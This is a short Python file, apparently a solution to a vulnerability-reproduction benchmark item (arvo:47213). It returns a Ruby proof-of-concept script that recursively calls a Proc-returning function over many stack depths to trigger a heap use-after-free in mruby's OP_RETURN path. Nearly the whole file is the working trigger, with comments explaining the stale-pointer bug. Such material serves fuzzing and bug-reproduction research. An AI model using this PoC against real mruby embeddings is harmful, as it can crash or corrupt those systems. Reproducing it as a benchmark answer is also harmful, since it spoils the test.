import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability in mruby (arvo:47213).
        The vulnerability is caused by a stale 'regs' pointer in OP_RETURN after mrb_stack_extend
        is called when returning from a Proc with an environment.
        """
        return b"""
def trigger(depth)
  if depth > 0
    trigger(depth - 1)
  else
    # Capture a variable to ensure the Proc has an environment
    x = 1
    # Returning from this Proc triggers the specific OP_RETURN path
    # which calls mrb_stack_extend(mrb, 3).
    Proc.new { return x }.call
  end
end

# We need to hit the exact stack usage where adding 3 slots triggers a reallocation.
# Since mruby stack grows dynamically (doubling capacity), we iterate through
# various depths to find the boundary condition that triggers the realloc
# and subsequent Use-After-Free.
(1..5000).each do |i|
  begin
    trigger(i)
  rescue
    # Ignore SystemStackError or other runtime errors; we are looking for a VM crash.
  end
end
"""